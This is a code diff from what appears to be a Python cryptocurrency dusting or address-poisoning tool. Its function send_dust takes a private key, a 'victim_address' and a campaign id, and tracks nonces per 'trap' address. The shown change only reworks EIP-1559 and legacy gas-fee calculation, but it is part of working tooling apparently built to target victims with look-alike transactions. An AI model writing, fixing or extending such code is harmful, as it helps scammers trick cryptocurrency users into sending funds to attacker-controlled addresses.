@@ -392,40 +392,48 @@ def send_dust(private_key, victim_address, campaign_id=None):
             _local_nonces[trap] = max(_local_nonces[trap], rpc_nonce)
         nonce = _local_nonces[trap]
 
-        # --- DYNAMIC GAS & EIP-1559 / LEGACY PRICING ---
+             # --- DYNAMIC GAS & EIP-1559 / LEGACY PRICING (Matched to batch_fund.py) ---
         latest_block = call_with_retry(w3.eth.get_block, "latest")
-        fee_buffer = getattr(config, 'GAS_FEE_BUFFER', 1.15)
-        max_fee_cap_gwei = getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 500)
-        max_fee_cap = w3.to_wei(max_fee_cap_gwei, "gwei")
+        
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block 
+            and latest_block["baseFeePerGas"] is not None 
+            and CHAIN.lower() != "bsc"
+        )
 
-        if "baseFeePerGas" in latest_block and latest_block["baseFeePerGas"] is not None:
+        gas_params = {}
+        # Match batch_fund.py's safer 100 Gwei cap default
+        max_fee_cap = w3.to_wei(getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 100), "gwei")
+        
+        # First attempt, so gas_bump is 1.0
+        gas_bump = 1.0
+
+        if use_eip1559:
             base_fee = latest_block["baseFeePerGas"]
+            
             try:
                 max_priority = w3.eth.max_priority_fee
             except Exception:
-                max_priority = w3.to_wei(getattr(config, 'GAS_PRIORITY_FEE_GWEI', 0.05), "gwei")
+                max_priority = w3.to_wei(0.05, "gwei")
 
-            max_priority = min(max_priority, max_fee_cap)
-            calculated_max = int((base_fee * fee_buffer) + max_priority)
-            max_fee = min(calculated_max, max_fee_cap)
+            max_priority = int(max_priority * gas_bump)
+            buffer = 1.1 * gas_bump  # 10% buffer, matching batch_fund.py exactly
+            max_fee = int((base_fee * buffer) + max_priority)
+            max_fee = min(max_fee, max_fee_cap)
 
+            # Invariant: maxFeePerGas >= maxPriorityFeePerGas
             if max_fee < max_priority:
                 max_fee = max_priority
 
-            gas_params = {
-                "maxFeePerGas": max_fee,
-                "maxPriorityFeePerGas": max_priority
-            }
+            gas_params['maxFeePerGas'] = max_fee
+            gas_params['maxPriorityFeePerGas'] = max_priority
             effective_gas_price = max_fee
         else:
-            try:
-                gas_price = w3.eth.gas_price
-            except Exception:
-                gas_price = w3.to_wei(1, "gwei")
-            effective_gas_price = min(int(gas_price * fee_buffer), max_fee_cap)
-            gas_params = {
-                "gasPrice": effective_gas_price
-            }
+            gas_price = w3.eth.gas_price
+            legacy_buffer = 1.05 * gas_bump  # 5% buffer for legacy chains
+            capped_gas_price = min(int(gas_price * legacy_buffer), max_fee_cap)
+            gas_params['gasPrice'] = capped_gas_price
+            effective_gas_price = capped_gas_price
 
         chain_id = w3.eth.chain_id
 
